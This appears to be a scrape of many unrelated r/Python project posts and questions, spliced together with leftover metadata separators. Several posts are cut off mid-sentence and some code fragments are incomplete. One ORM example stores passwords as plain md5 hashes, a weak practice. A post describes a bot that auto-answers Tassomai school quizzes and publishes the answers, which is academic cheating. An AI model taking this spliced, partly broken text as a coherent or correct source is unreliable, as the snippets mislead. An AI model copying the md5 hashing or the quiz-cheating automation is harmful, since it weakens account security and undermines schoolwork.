I have completed this example exercise, however when I review [Allen's solution](https://github.com/AllenDowney/ThinkPython/blob/master/code/grid.py) to this problem it appears to break down when attempting a similar solution using Python 3. As his code does not use parenthesis for the print function I'm assuming his solution works well in Python 2.

I am learning in the Python 3.9 IDLE and I don't think I can approach the problem in the same way he does, as there seems to be a difference in the way the two different versions of Python treat commas within the print argument to append text to the same line.

I know this thing is far from perfect, but I'm just actually really excited that it works just the way I want it.

The readme file on git is pretty empty so I'll just describe really quick what the project was about.

At work we do all of our calculations in this excel file, transport cost, cost to buy in the product, our profit.

This is then spun with a lot of vba code (ex. pressing a button to look up the distance from one postal out client's address and based on that distance look up our transport cost) that I've built and also asked in the r/excel subreddit here on Reddit. suuuuper helpful guys and girls!

Anyway, So up to this point we have had to do the calculations in excel and THEN move all the details over to this economic system (Fortnox) to actually build the offer manually, row by row. Super annoying.

So These scripts do all that for me. I also added some web scraping so A client can be made right there in excel.

Here is a link to the repo: [mystic-why](https://github.com/garashchenko/mystic-why)

And here is a short video of these RGB effects I developed: [video](https://youtu.be/I_q0ZEQXTls)

I have built a new PC recently and was quite disappointed with a tool MSI provides for controlling RGB. There were a few open-source apps (MSIRGB, OpenRGB) already but none of them worked with newer motherboards. 

I had no idea how RGB controllers worked and where to start. Luckily I found some discussions on GitHub and some useful articles which helped me a lot. Turns out that an RGB controller is just an HID device and you can communicate with it using pyusb or hidapi modules.

But what kind of messages do I send to the controller? I used Wireshark to capture USB packets but I still didn't know which byte did what and I didn't want to brick my RGB. Well, Mystic Light is written using .NET so I used dnSpy to decompile it and found out which kind of packets are expected. Moreover, there was an ability to control single LEDs in this software but it was nowhere to be found in the Mystic Light GUI. 

I wanted new LED effects to be created easily so I made a base class for them which offers some kind of template for a developer. Lastly, I made some kind of dynamic GUI (my first GUI in Python actually) using PySimpleGUIqt.

For a new user the script takes the user's user id/email, the site and gives the user a choice for computer generated password(using random module and string module) or user's own password.

Then it asks the user for a master password (this is important,cannot be forgotten ), which it uses to derive a key from the password after salting it (using hashes and pkdf2 from cryptography module).

Then it initializes a Fernet key and encrypts the data and stores it in a text file.

For viewing or adding passwords ,the user needs to run the script again ,select the appropriate option from the menu (details can be seen by typing 'help' when the script is run) and enter the master password to decrypt the data.

After finishing the purpose for the password, the user needs to type 'encrypt' which encrypts the file again.

things like the number of layers, number of nodes in each layer, number of output nodes, loss functions, model checkpointing, early stopping are taken care of.

All the preprocessing that you will ever need is built right into the layers of the model so that the model just accepts raw data and preprocesses it by itself without the need to have separate functions. *(makes deployment a hell of a lot easier)*

I've released a new version of the [Dependency Injector](https://github.com/ets-labs/python-dependency-injector) 4.4. It makes possible to use Dependency Injector with [FastAPI](https://fastapi.tiangolo.com/).  
**Example**

File  fastapi\_di\_example.py:

    import sys
    
    from fastapi import FastAPI, Depends
    from dependency_injector import containers, providers
    from dependency_injector.wiring import inject, Provide
    
    
    class Service:
        async def process(self) -&gt; str:
            return 'Ok'
    
    
    class Container(containers.DeclarativeContainer):
    
        service = providers.Factory(Service)
    
    
    app = FastAPI()
    
    
    @app.api_route('/')
    @inject
    async def index(service: Service = Depends(Provide[Container.service])):
        result = await service.process()
        return {'result': result}
    
    
    container = Container()
    container.wire(modules=[sys.modules[__name__]])

To run the example install the dependencies:

    pip install fastapi dependency-injector uvicorn 

and run uvicorn:

    uvicorn fastapi_di_example:app --reload 

You should see in the terminal something like:  


    INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
    INFO:     Started reloader process [11910] using watchgod
    INFO:     Started server process [11912]
    INFO:     Waiting for application startup.
    INFO:     Application startup complete.

and  [http://127.0.0.1:8000](http://127.0.0.1:8000) should return:

    {"result": "Ok"}

**Testing**

File  [tests.py](https://tests.py):

    from unittest import mock
    
    import pytest
    from httpx import AsyncClient
    
    from fastapi_di_example import app, container, Service
    
    
    @pytest.fixture
    def client(event_loop):
        client = AsyncClient(app=app, base_url='http://test')
        yield client
        event_loop.run_until_complete(client.aclose())
    
    
    @pytest.mark.asyncio
    async def test_index(client):
        service_mock = mock.AsyncMock(spec=Service)
        service_mock.process.return_value = 'Foo'
    
        with container.service.override(service_mock):
            response = await client.get('/')
    
        assert response.status_code == 200
        assert response.json() == {'result': 'Foo'}

To run the test install the dependencies:

    pip install pytest pytest-asyncio httpx

and execute:

    pytest tests.py

You will something like that in the terminal:

    ======= test session starts =======
    platform darwin -- Python 3.8.3, pytest-5.4.3, py-1.9.0, pluggy-0.13.1
    rootdir: ...
    plugins: asyncio-0.14.0
    collected 1 item
    
    tests.py .                                                      [100%]
    
    ======= 1 passed in 0.17s =======

**What is the advantage?** 

FastAPI is a powerful framework for building API. It has basic dependency injection mechanism.

This integration brings the dependency injection in FastAPI to the next level. It makes possible to use it with Dependency Injector providers, overridings, config, and resources.""|||Using Computer Vision to Loop Guitar Audio by Tilting the Guitar|||Python|||12|||7|||1605679499|||""Hello lovelies!

It's a Chess UI with rules enforcement using a Numpy array as the chessboard. You can input the coordinates of a piece (using standard A-H,1-8 coordinate systems), and the square you want to move it to. The program will interpret the move as a transformation of the 'chessboard' array, and will check to see if it's a legal move or not. It then uses turtle to display the chessboard, along with check and checkmate if it occurs!

Here's the Github link: [https://github.com/EvanMcCormick1/NumpyChess](https://github.com/EvanMcCormick1/NumpyChess)

And here's the Imgur: [https://imgur.com/a/qQ2IuUM](https://imgur.com/a/qQ2IuUM)

&amp;#x200B;

The legality check has three main steps:

1. Find out what piece is being moved,
2. Check that the general movement conditions for that piece are satisfied,
3. Find out if the move results in your own king dying.

I implemented a series of true/false functions to do this. 

The main function, "legal move" sends the move to one of 6 piece-specific move-checks. Each of these, in turn, will return "true" or "false" depending on whether the move is 1. A legal type of movement for the piece in question, and 2. Physically possible on the current board (i.e. if there are any pieces in the way of a rook move).

Finally, the king\_dies() function actually makes the move, then checks to see if the opponent has any legal moves that result in the capture of the king. Then, it reloads the board to the previous position from a backup array, called saveboard.

The program also enforces check, and checkmate! Checking for checkmate was somewhat tricky, but checking for stalemate seems a bit harder, so I haven't impemented a stalemate check yet. Currently, the game notifies the player when check occurs, and the program ends after checkmate occurs.

The original version of it just printed out the array when the move was made, but the version I have now uses turtle to map out the board. Working with turtle has been one of the hardest aspects of this project. I kept debating between trying to make the whole thing a Tkinter GUI, or just using some python graphics program to display the board between user inputs. I eventually decided to go with the second option, as I'd already written the whole program engine, and I did not want to remake the whole thing in a tkinter shell. I was already having trouble with python, and I'm really not very good at Tkinter programming.

Currently there are a few bugs to sort out. The main problem I have with it is that the turtle chessboard isn't able to be open at the same time as my program takes user inputs. This is a problem. It's not a very useful UI if players have to memorize the position before they decide on the coordinates they use to make their move. I've found that I can cheat the system by entering the start and ending coordinates before closing the previous turtle board, and python will still read them in from input. This is the best way to use the program, as it effectively means the board immediately refreshes after each move. But if you put in an invalid coordinate (as i did many times), there's no way to re-enter the correct coordinates until you exit the turtle screen.

As for the gameplay itself, I haven't yet implemented castling rules nor a stalemate check. Both are quite doable though, so I should have a fully working chess program at the end of the week!""|||What to learn after learning all of the basics of Python|||Python|||1|||2|||1605662437|||""[removed]""|||GTSS: A tool for rendering guitar tracks from MIDI files|||Python|||5|||4|||1605661839|||""I made a program that generates realistic guitar tracks by reading MIDI files, selecting guitar note samples from a folder containing various guitar samples, arranging them, and exporting a DI guitar track in .wav format.

officeextractor can extract images, audio and video files from office documents like docx, xlsx, pptx, odt, ods and odp. It's 100% written in Python and my first (small) library that I've created and released.

The programming itself wasn't really that difficult. Office documents are actually just zip files, so it was pretty easy to extract the media files. I was a lot more difficult to learn everything else involved:

\- unit tests &amp; mocking/patching

\- learning how to use a CI like Travis for unit testing &amp; coverage reports

\-  setting up coverage.py and coveralls.io

\- setting up pre-commit together with black and mypy (and learning about type annotations)

\- And finally releasing to PyPI

&amp;#x200B;

If you're interested in officeextractor, have a look at the [GitHub repo](https://github.com/fbernhart/officeextractor) or the [PyPI page](https://pypi.org/project/officeextractor/).

You can install it using:

    pip install officeextractor

If you as well want to publish your first Python library and need any advise, I'm happy to help out!

Flawlessly handles multiple scheduled Meets, disables your camera &amp; microphone in-Meet, and even works in the background or with the display off — all at the click (double-click) of a button!|||Python|||4|||2|||1605565654|||""[MeetNinja on GitHub](https://GitHub.com/SHUR1K-N/MeetNinja-Google-Meet-Bot)

## Features
- Mulitple Meet sessions supported, according to the user-defined Meet schedule
- Works even with the display on sleep (and does not wake it up either)
- Works even in the background while you do other work (as long as you do not *explicitly* "Minimize" the browser window MeetNinja generates; just keep it open in the background, beneath your current open window(s))
- Automatically disables camera &amp; microphone in-Meet
- Color-coded &amp; concise activity logging (verbose) with timestamps of all activities
- Supported web browsers: Google Chrome &amp; Mozilla Firefox
- Automatically checks for a newer MeetNinja version upon every execution

## Usage
1. Clone this repository or download it as a ZIP file (and extract its contents)

2. PIP-install all the packages mentioned under the last subheading on this page, either automatically via running the "pip install -r requirments.txt" command, or manually via separate "pip install" commands for each package

3. Do not run MeetNinja.py just yet. First, open it using any editor, and substitute your inputs (Google Meet URLs, their start times, duration of all Meets, Google username, password, path to the web driver file of your respective browser and OS) into the dummy values in the following section of the code (highlighted): [open image on GitHub page](https://GitHub.com/SHUR1K-N/MeetNinja-Google-Meet-Bot)
4. Save your changes, and run the program (either by double-clicking MeetNinja.py, or executing it via a terminal window if you are feeling particularly geeky today)

5. Take the chillest of pills (figuratively) and abandon all your worries; MeetNinja's got your back

### What MeetNinja Does
Upon execution, MeetNinja generates a new Google Chrome / Mozilla Firefox window in Developer Mode, and this new window stays idle until it is time to join your first Meet (according to your schedule). Once it is time, MeetNinja automatically logs you into your Google account, navigates to the first Meet URL, disables your camera &amp; microphone, joins the Meet session, and then waits until the duration specified (60 minutes by default) before ending the call and repeating the same for the *next* Meet session (whenever it may be) and so on, until your schedule has exhausted *(phew)*  all this with just a single (double) click!

## Tip(s) for CyberJedi-like Usage
### Wake-on-LAN
You may use MeetNinja paired with Wake-on-LAN / Magic Packet (if your motherboard and network adapter support it) for the optimal, ultimate "Away From Keyboard" automation experience.

You would be surprised by how common a feature WoL is in most modern *and* semi-modern systems. Hence, definitely *do* check it out. It is super cool, convenient, easy, helpful, andimportantlynative.

I highly recommend [**this Android app**](https://play.google.com/store/apps/details?id=co.uk.mrwebb.wakeonlan "this Android app") (ad-free, free, light, simple) for sending WoL packets to your computer system over the air and triggering a wake-up from the Hibernation / Sleep state without even touching the system (ironic how you would wake your system up so you could sleep, hah!).

### Chrome Remote Desktop / Microsoft's RD Client
You may also need or use the above remote desktop client(s) if you need to mid-sleep-check on your progress or if your computer system has a login password you may need to enter remotely after a Wake-on-LAN.

## Note
1. MeetNinja works even in the background while you do other work on other windows, as long as you **do not *explicitly* "Minimize" MeetNinja's generated browser window**; just keep it open in the background, beneath your current open window(s)

2. There is *deliberately* no Headless Mode (at the moment) due to potential complications arising from exiting MeetNinja while a Meet is still active (such as the Meet not relatively "naturally" ending and you being a part of the Meet unknowingly till the end of time)

3. Although you may abort the process at any stage or time by pressing CTRL + C from within the MeetNinja console / terminal window, it is not advised to do so from within an active Meet (for reasons similar to the previous point)

## Dependencies to PIP-Install
- **selenium** (for web browser-based automation)
- **requests** (for automatic update checks)
- **datetime** (for scheduling &amp; timestamps)
- **pause** (for scheduling)
- **colorama** (for colors)
- **termcolor** (for colors)

1. Instead of mixing model and object class together, object classes "know nothing about their model":

&amp;#x200B;

    class Group:
        def __init__(self):
            self.id = None
            self.name = None
    
    class User:
        def __init__(self):
            self.id = None
            self.username = None
            self.fullname = None
            self.status = None
            self.group_id = None
            self.created_at = None
            self.group = None

&amp;#x200B;

While models are defined seprately and know what class objects they should produce:

&amp;#x200B;

    import sql
    
    class Groups(sql.Table):
        schema = None # public
        name = 'groups' # Table name
        type = Group # Object class
        fields = {
            'id': {'type': 'int'},
            'name': {}
        }
    
    class Users(sql.Table):
        name = 'users' # Table name
        type = User # Object class
        fields = {
            'id': {'type': 'int'},
            'username': {}, # Default is string
            'fullname': {},
            'password': {'encoder': lambda plain: md5(plain)},
            'status': {'options': ['active', 'disabled']},
            'group_id': {'type':'int'},
            'created_at': {'type': 'date'}
        }
        joins = {
            'group': {'table':Groups, 'field':'group_id'}
        }

Standard model methods work as excepted:

    user = Users.get(1), 
    
    # Returns added user object
    user = Users.add({'username':'john', 'password':'123'})
    
    # Returns saved User object
    user = Users.save(1, {'fullname': 'New Name'})
    
    # Contains list of users
    users = Users.all(order={}, limit=None, filter={}, search={})
    
    # result.total - Contains totally matched item count
    # result.items - Contains items for page 1 when limit per page was 5
    result = Users.filter(page=1, order={}, limit=5, filter={}, search={})

&amp;#x200B;

2. One query per method approach:

Only 1 query is executed per get, add, save, all, filter, for example:

    Groups.add({'name': 'Manager'})

Will produce:

    WITH "groups" AS (
    INSERT INTO "demo"."groups" (name)
    VALUES ('Manager')
    RETURNING groups.id, groups.name )
    SELECT groups.id, groups.name
    FROM "groups"

Use log level logging.DEBUG to see queries in logs.

&amp;#x200B;

3. Add and save work with dict types, this is handy when data comes from API call:

    # Add
    data = {
        'username': 'john',
        'pasword': '123',
    }
    user = Users.add(data)
    
    # Save
    data = {
        'password': 'new_password'
    }
    user = Users.save(1, data)

Give it a try:

    pip install postgresql-orm
    pip install psycopg2

Here's refinement types for function arguments.|||Python|||23|||34|||1605508194|||""https://github.com/vixrant/python-type-theory

In simple terms, a refinement type is a data type with some condition (predicate). So you can define a type of all natural numbers as 

` N = { z : Z | z &gt; 0 } ` where Z is the set of integers.

With this, you can abstract away all the pesky data validations in your project and let the programming language handle them.

There's a lot of cool research in type systems going on (see LiquidHaskell), and my project is on adding refinement types and dependent types to Python.

I've so far implemented refinement of function parameters using type hints. It's pretty simple to understand but can have great impact on readability of code. A decorator checks the type hints in function declaration for predicate functions and returns a wrapped function which only performs its task if all the predicate functions return true. I'm yet to check the performance penalty for this.

I found my approach pretty cool because like PEP 484 says in the abstract, "the semantics were deliberately left undefined" and we can work on pretty interesting type systems apart from the popular ones.

I'm still reading a lot about type theory and applying to grad school to learn more, so I'll be updating this repo along the way. I'll be happy to accept contributions! My current task is to work on refinement of variables, though I'm trying to figure out how to get annotations of locals in a function (no mention of it in PEP 526).""|||Python Video Tutorials for 10 Years Old?|||Python|||1|||2|||1605507992|||""[removed]""|||How to enable fuzzy finder everywhere with Python|||Python|||2|||0|||1605506549|||""Here's how to use fuzzy finder outside of the terminal with just a few lines of Python.

you do (for example):

`for i in range(a, b/x, x):`

instead of:

By that, what I mean is if my (hypothetical) company has a web site (say, something like amazon.com) my target audience would be an average consumer (or just plain consumers). I'd most certainly have an app for it, and also a website. Then of course, there are games. My (hypothetical) company can/may have developed a game for mobile platforms - Android/iOS - and for the sake of broadening the scope, also a web site (totally unrelated to my company having a web site like Amazon BTW). My company also could have developed an application that installs on a computer (assume something like Adobe Photoshop). What am I getting at? Read on. 

So here's what I don't understand - there are games, there are apps (serving various purposes), and there are software applications, and in none of these Python is a major player (Yes.

I'd like to show everyone what I've been working on. I first made this in June or so, and made the most recent changes in October.

A basic description is, it generates a worksheet template based on news articles or the user's pasted in text (Youtube subs are fair game!) and it gives you the article, a vocabulary page, some fill-in-the-blank questions, and the framework for some comprehension questions so you can fill them in yourself.

&amp;#x200B;

The backend is flask, and it uses a few Vue.js components on the front end.

It uses a couple of APIs to gather news articles and definitions and the like, and it web scrapes for the actual content of the articles on request.

It's got a few nifty JS functions - check out the word selection page!

I'd love to plug some ML into it and get it to actually generate the questions too, but it's not currently on the cards. I would definitely like to make more of the sheet editable on the site. I think a change over to an API backend and a React front end would make that more realistic. We'll see! At the moment, I'm smashing out another language-related topic, this time in React only.

Currently on the CV bombing path, trying to get my first programming job, but as a UK guy based in Seoul its not being easy! Fighting the good fight, I guess.

The word documents are then edited using the [python-docx](https://python-docx.readthedocs.io/en/latest/) library to manipulate the word documents XML files. The numbered word files are then made available for download by the web application.

The application requires any document to have Heading 1 Headings as these are used for identifying where to start the page numbering from as Python-docx can not always accurately find lastRenderedPageBreak

That will come too. But for now -

I've tried the popular managers :

* pip
* conda
* poetry

But I find conda to be the **worst** of the lot. Don't get me wrong; I Love the organization it comes from and all their contributions. But as a touted package manager, Anaconda is So bad...when it's bad.

When it works, it installs everything fine etc. But when a dependency is broken, it will Drown you in errors, that it's impossible to resolve it, most of the time. You inevitably end up starting from scratch. I really wish they'd be cleaner in their error displaying.

When you try to install something from the conda prompt, it makes a huge slow show of searching for a package before failing to find it in any of the sources, which is extremely poor compared to how pip does it - possibly better indexed packages in the latter . I don't care that you don't have the package. Just, tell me sooner :-/

They also make it extremely difficult to see what other packages a package depends on. Although I'll grant that's not something they should even take responsibility for. Ignore this last statement. It's just misguided.

One might ask, why do I still use it when it's given me so much grief? Well, my organization uses it and it's trickle-down-usage here . I Love pip on a personal capacity and I intend to start contributing to thei r codebase soon.

Are you happy with your usage of Conda? If yes, what's working for you ? How do you use it day-to-day?

I want to get some practice using Docker and I think I understand it conceptually - Docker containers are essentially environments that contain dependencies to run an app/code so that it can be deployed via 'images' to any other machine/server. 

However,  I am not completely clear on how to get my Python script into a Docker container and run/debug on that container.

As am learning french and I wanted to introduce me into french music, I employed [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/) to webscrap a website that recommends a song in french every day, to get the recommended songs from all old daily posts.

Later I employed [Selenium](https://selenium-python.readthedocs.io/) and the [Spotify Web API](https://developer.spotify.com/documentation/web-api/) to create a playlist automatically with the list of songs.

Now I only re-run the script once per week to automatically add the new recommended french songs to the playlist.

So I have made a Tetris game from python and a module named pygame(it may be quite familiar to some). It has a beautiful background image and Circles by Post Malone will play in the background as an audio asset. Like its having more than 400 lines of code.

I have listed some of the prerequisites and I instructions to play so that you could have a great time with it you can download the game from  
[GitHub](https://github.com/achaljhawar/tetris) or from [itch.io](https://achaljhawar.itch.io/tetris).

If you like it you could share it with others and don't forget to drop a star on the repository it helps or you could donate me itch.io.

## Perquisites

You'll need [pygame](https://www.pygame.org/download.shtml) and [python](https://www.python.org/downloads/) installed on your computer.  


    pygame@1.9.5 or above python@3.9.6 or above 

## How to play

    # Clone this repository 
    $ git clone https://github.com/achaljhawar/Tetris  
    # Go into the folder 
    $ cd Tetris  
    # Run the python file 
    $ python tetris_game.py 

Enjoy the game its amazing and I am sure you'll love it.

## Instructions to play

1. You can use the  arrow keys to rotate the pieces.
2. You have to complete the lines of the grid to get points.
3. If you can not fit the pieces in the grid you lose.
4. For every line you complete you get 10 points.

Recently, I have been interested about the idea of faster/slower programming languages. I know that languages like C++ are supposed to run faster than Python since they are compiled and then executed while Python is interpreted at execution and that Go is somewhere in between those two.

However, that lead me to think of the following question:

Would a Python code that is compiled into a .exe file run as fast as that of a C++ since they are both already compiled?

Yeah. I did. **So I decided to write a program to automate it!**

If you don't know what Tassomai is then it's basically a website based on science quizes and you have to answer a certain amount of questions correct for that day to complete your daily goal.

It took a few weeks to make, alot of hard work, but had a lot of fun making it. It is a GUI built with PyQt5.

The modules I used were:  
\- **PyQt5\_Tools** for the Graphical User Interface.  
\- **Selenium** for browser automation.  
\- **Parsel** for locating elements with xpath.  
\- **Requests** for retreiving data.  
\- **PyGithub** for storing the answers in a database on my github.  
\- **youtube\_dl** for yoinking a function from .compat.

# How It Works:

  
1. It will enter the user's credentials, wait until the start quiz button has been found and then click on that element to start the quiz.

2. It will detect if a video has been offered and if so then click 'No thanks', this is the same with the stats part which is placed before the video.

3. Now we are at the quiz, it has to detect if we've seen this question before by reading `answers.json` in `AppData/Local/tassomai-automation`

4. If so, then loop through all boxes (the 4 available answers), and if the processed text of the box is equal to the stored answer then we know which box it's in, therefore can use this data to click the correct box.

5. Otherwise, if the question isn't found in `answers.json` then it will call a function that answers a random box by listing all the boxes and using the `random` libary to choose one in the list to click it and return if it's correct or not.

6. If the answer was correct or not, it will call a function to find the correct answer. We do this by looping through all the boxes, and if the boxes `background-color` css property is equal to green - `rgb(201, 240, 195)`, then store `{question: answer}` in `answers.json`.

7. This is all for 1 question. It will do this X times (depending on how many sections there are in the quiz)

8. At the end of the quiz, it will grab the dictionary in `answers.json` and store it online [here](https://github.com/Gloryness/tassomai-automation/blob/master/answers.json).

It uses Voil to render the output of the notebook as a webapp. It was my first time using this stack, including ipywidgets and ipyvuetify. Was really pleasantly surprised with how smooth it works. Especially ipyvuetify, which wraps Vuetify (a Vue library) makes your app look really fancy, with automatically included animations for changes to CSS properties. That was a really nice surprise :)

The uncertainty estimates for the coalitions are currently just the sums of the lower and upper boundaries of the chosen parties, which is a very rough approximation (still working on a better estimate using the raw poll simulation data).

No bootstrap (Coded html and css on my own)

Due dates for todos (when creating todos, you put a date and time to when you complete them)

Updating user accounts

Forgot password (might not work because of google's gmail security, you can try locally)

2. most of the rest of the team: traders + math folk who know python and can code in it just fine... none of them have done big projects though

I'm looking for a good read or articles or project to have a look at to figure out how to structure these things better.  It all gets so messy, so quickly.  We use Pandas heavily, so that doesn't help.  The dataframes are flowing all over the place with nothing (yet!?!) in place to enforce any structure.  By that I mean, people can add/delete/rename columns at any moment and the break will pop up miles away in some other code.

We're early enough in building out, so there's time, but I'm not sure what the best angle / structure / design decisions I should try to use/enforce to make this stuff more maintainable.

Not to praise or knock any relevant language, as we all know they all have their place and purpose.

There are a lot of profiling tools in the market. However, most of them share a common shortcoming  They provide too much information.

Dont get me wrong, Im not saying information is a bad thing. Sometimes we do need details to figure out why our code is slow, but for larger production level project, we are often more interested at transaction level profiling.

So, what is transaction level profiling? We should discuss function level profiling first, which is a more familiar concept for programmers. Take Pythons built in profiler  cProfile as an example. The profiling unit is function. cProfile will generate call count/time consumed information of each function. This is useful when we try to locate the bottleneck of a CPU-bound script. However, it suffers from relatively large overhead, which causes skewed result, and its not intuitively clear because we have too much to read.

It would be nice, if we could focus on the important functions, for instance, the API function to http requests, or the entry function for a very important feature. This will give us a big picture about the time consumed of each job, or transaction. The obvious advantage of doing it is we saved all the overhead of logging/recording the nonsignificant functions(if you implement correctly, of course), which makes the result reflects the reality better. The other benefit is simply a clearer result, especially if we could visualize it.

VizTracer now has a way to do this.

VizTracer can always log every single function and visualize them using trace-viewer.

[ result of viztracer ](https://preview.redd.it/knv5r6isa3y51.png?width=875&amp;format=png&amp;auto=webp&amp;s=5a66f083e7cfb71719de1108165bb6efdb537212)

This is detailed information of a MCTS running. You can zoom in for details of the execution of any single function. Like I said before, this is very helpful in a lot of cases for profiling and debugging.

However, sometimes this method does not work perfectly. For example, when we are using multiprocessing pool. The built-in library needs to take care of the underneath logic so we are getting a lot of extra information that is not related to our work. Lets grab a piece of code from Python official website as an example:

    from multiprocessing import Process, Pool
    import os
    import time
    def f(x):
        return x*x
    if __name__ == "__main__":
        process_num = 5
        with Pool(processes=process_num) as pool:
            # print "[0, 1, 4,..., 81]"
            print(pool.map(f, range(10)))
            # print same numbers in arbitrary order
            for i in pool.imap_unordered(f, range(10)):
                print(i)
            # evaluate "f(20)" asynchronously
            res = pool.apply_async(f, (20,))      # runs in *only* one process
            print(res.get(timeout=1))             # prints "400"
            # evaluate "os.getpid()" asynchronously
            res = pool.apply_async(os.getpid, ()) # runs in *only* one process
            print(res.get(timeout=1))             # prints the PID of that process
            # launching multiple evaluations asynchronously *may* use more processes
            multiple_results = [pool.apply_async(os.getpid, ()) for i in range(process_num)]
            print([res.get(timeout=1) for res in multiple_results])
            print("For the moment, the pool remains available for more work")
        # exiting the 'with'-block has stopped the pool
        print("Now the pool is closed and no longer available")

[ multi process result, every thread is collapsed to show the whole picture ](https://preview.redd.it/3lephvrza3y51.png?width=875&amp;format=png&amp;auto=webp&amp;s=4b4ccca285c9c6ee885d7d88b29f39994a1b911f)

 The only function Im interested in is `f()`, of course in real projects thats a much complicated function. However, its not easy to locate where it is executed because we have too much information.

So, we can use the log sparse feature of VizTracer. We need to add `@log_sparse` decorator to the function we are interested in. And run VizTracer with `--log_sparse`

    from viztracer import log_sparse
    
    @log_sparse
    def f(x):
        return x*x

[ viztracer result with log sparse ](https://preview.redd.it/j6p5w16db3y51.png?width=875&amp;format=png&amp;auto=webp&amp;s=94064f417cfc43030b63ff55825a913bbe22f79f)

 Now we only have the records of `f()`. Its expected that the actual execution of `f()` is not significant because its a very simple function and the overhead of multithreading pool is not small. We can change `f()` to a more time-consuming function: 

    def f(x):
        ret = 0
        for i in range(x*400):
            ret += i * x
        return ret

 And the result will be more interesting: 

&amp;#x200B;

[ viztracer result with large f ](https://preview.redd.it/jw0fbzfkb3y51.png?width=875&amp;format=png&amp;auto=webp&amp;s=9100b8157da451a9a33e3e655782739d1187e8e1)

You can easily observer the concurrency of a multiprocessing pool.

multiprocessing pool is not the only case when this sparse log feature comes into hand. When we run functions in asyncio, or web applications, or any other program when our code runs on an existing complicated infrastructure, VizTracer with `--log_sparse` feature can let you focus on your code of interest, instead of wasting time on filtering out the information that you dont care.

If you got interested in VizTracer, just be aware that it has far more features and abilities than sparse log.

Working on a "code breaker" game, in its simplest form.  The user inputs a set of 5 numbers (one by one) and in order to "guess the code" the numbers need to go: even, even, odd, even, odd. I used if/else and dummy variables to make a list storing if the values are even/odd. If there a way for me to use for loop or something to then read the list of even/odd values and if the pattern is correct return "you got it" and if not return "try again". Here's what I have so far to make the list of "even/odd answers"

    n1 = int(input("please enter a whole number: "))
    n2 = int(input("please enter a whole number: "))
    n3 = int(input("please enter a whole number: "))
    n4 = int(input("please enter a whole number: "))

    N = [ ]

    code = (guess_code_to_my_heart(n1, n2, n3, n4, n5))

**PyCabinet:**

Once you've loaded in a directory's file path, PyCabinet creates a cabinet object that allows you to slice, dice and filter the items in that directory, outputting file/folder names or paths. This process can even be 'stacked' similar to pandas dataframes.

I find it particularly useful when needing to systematically access dated files such as databases where another script might be creating them on a schedule each week.

**Some examples of use below:**

    &gt;&gt;&gt; import pycabinet as pc

    &gt;&gt;&gt; files = c.files()

Once you've loaded in a directory's file path, PyCabinet creates a cabinet object that allows you to slice, dice and filter the items in that directory, outputting file/folder names or paths. This process can even be 'stacked' similar to pandas dataframes.

I find it particularly useful when needing to systematically access dated files such as databases where another script might be creating them on a schedule each week.

**Some examples of use below:**

    &gt;&gt;&gt; import pycabinet as pc  
    &gt;&gt;&gt; c = pc.cabinet(r'/Users/Nick/downloads')  
    &gt;&gt;&gt; files = c.files()  
    &gt;&gt;&gt; print(files['.zip'])  
    ['ParquetViewer_v1.1.0.0.zip', 'SQLiteStudio-3.2.1.zip']    
    
    &gt;&gt;&gt; print(files['.zip'][1])  
    'SQLiteStudio-3.2.1.zip'   
    
    &gt;&gt;&gt; print(files['Par'])   
    'ParquetViewer_v1.1.0.0.zip'   
    
    &gt;&gt;&gt; files = c.files(full_path=true)

I was curious if anyone had any experience with any good ML social media bots to help build a following. I'm fairly new to python and would love to hear any suggestions. I'm going to be focused on the usual IG/Twitter/Facebook platforms and was looking for something that automates posting, liking, and commenting (If I had to pick a main platform it would be Twitter).

I understand you cannot truly build a successful account without a well thought out model and manual effort, but any recommendations would be truly appreciated.

I am  just starting to learn python and we are making "FUN SHAPES AND PATTERNS"  and per usual my teacher has yet to go over spacing and all that fun stuff.  I am supposed to make an hourglass that prints the same number on each line and add two additional values to each line, Top line starts with n (aka n-1) , has 1 as middle line, and last line is n (aka n-1). So if I called 3  it would produce:

    print(hourglass(3))
    
    33333
 222
  1
 222
33333

We made multiplication tables the other day but I only figured out the  spacing stuff by brute force. I have managed to figure out the bottom piece of the hourglass but can't get the top piece. Here is what I have for the bottom

    BOTTOM HALF
    [IN]:
    
    n=6
    #print leading number/aka determine the number each row will start with
    for i in range(1,n):

            print(" ",end='')
        # determines the number of i "values" to print on the line 
        for k in range(1,2*i):

I just can't not figure out the top half. This is what I have so far:

&amp;#x200B;

TOP HALF:

    [IN]:
    
    n = 6
      
    # for loop for printing upper half 
    for i in range(2, n):  
        print()
        for k in range(i, n):  
          print("", end = "")

    22222
    
    3333
    
    444
    
    55

By just shoving stuff around I managed to get this.  I can not figure out how to::

1).  How to make the numbers decrease from n, 

2).  Make rows have same number of n values as top. I.e if n is 5, the row should have 9 5's,  7-4;'s, 5-3's,  3-2's,

3). Center the numbers.

I created a few default "generators" similar to Youtube's and Heroku's codes, but there's also the possibility to build your own patterns using Nouns, Verbs, Adjectives, Cities or Numeric codes. For example:

I'm proud to introduce a web-app I've been working on for the past few months, SeeLink. I built it using Python, Flask, and PostgreSQL. 

SeeLink is a link sharing and collaboration platform that enables you to save and share links from all around the web.

**What's SeeLink For?**

SeeLink is one of the first link sharing and collaboration platforms. SeeLink enables its users to store, share, and save links from all around the web. You could use SeeLink to store links of your interest, and share them with friends, family, or teammates.

**Why was SeeLink created?**

SeeLink was created to simplify sharing links with friends and family. Conventionally, sharing links with people was done through messaging apps, where they would get lost in the sea of messages. SeeLink allows its users to create boards to share links with specific people, allowing them to save and share human-readable links at the click of a button.

There's still a lot that I'd like to improve in SeeLink, and if there's anything you'd like to see added to that list, please let me know! Also, I'm looking to get some user feedback before I launch to more people, so all feedback is welcome!

You can join SeeLink and try it out, at [https://seelink.app](https://seelink.app/).

For the past 3+ years, I've been working on a project that is now ready to be publicly released. It's a static code analysis and code auditing framework called Aura. The main goal of this project is to address the issue of malicious (and vulnerable) code published on PyPI by periodically scanning all the packages on PyPI and eventually doing that in real-time as they are uploaded there. This is accomplished by doing a recursive static analysis of a code that is using semantic signatures (inspired by PEP 622!) to look for signs of malicious code, anomalies, or vulnerabilities via taint analysis. It is also able to analyze non-python code/input such as signs of manipulating with the wheel packages, binary files (using Yara), exposed sensitive information similar to gitleaks, and so on; think of it like VirusTotal but for source code. The data collected by scanning the whole PyPI repository is [published for free](https://cdn.sourcecode.ai/pypi_datasets/index/datasets.html) (CC BY NC) in JSON format so anyone can use it for further research.

&amp;#x200B;

